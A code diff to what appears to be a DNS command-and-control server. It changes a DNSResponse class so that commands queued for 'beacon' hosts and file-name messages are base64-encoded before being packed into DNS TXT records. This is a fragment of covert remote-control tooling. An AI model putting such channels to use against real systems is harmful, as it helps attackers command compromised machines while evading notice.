@@ -2,7 +2,7 @@
     File containing classes and functions to handle a DNS Response
     @author Dosh, JRoc
 """
-import struct
+import struct, base64
 
 """
     Class to represent a DNS Response and functions to build it
@@ -92,6 +92,7 @@ class DNSResponse:
             else:
                 if self.sendAll:
                     full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
+                    full = base64.b64encode(full)
                     length = len(full)
                     self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
                     self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
@@ -102,6 +103,7 @@ class DNSResponse:
                         if self.addr[0] == x.ip:  # beacon was in the list, send its commands
                             found = x
                             full = ';'.join(cmd for cmd in x.cmds) # concat commands with semicolon
+                            full = base64.b64encode(full)
                             length = len(full)
                             self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
                             self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
@@ -130,6 +132,7 @@ class DNSResponse:
     """
     def send_file_name(self, f):
         msg = "file " + f
+        msg = base64.b64encode(msg)
         self.packet += struct.pack("!H", len(msg) + 1) #RDLENGTH length of file name
         self.packet += struct.pack("B", len(msg)) #TXTLENGTH 
         self.packet += ''.join(struct.pack("c", x) for x in msg) # loop and store name
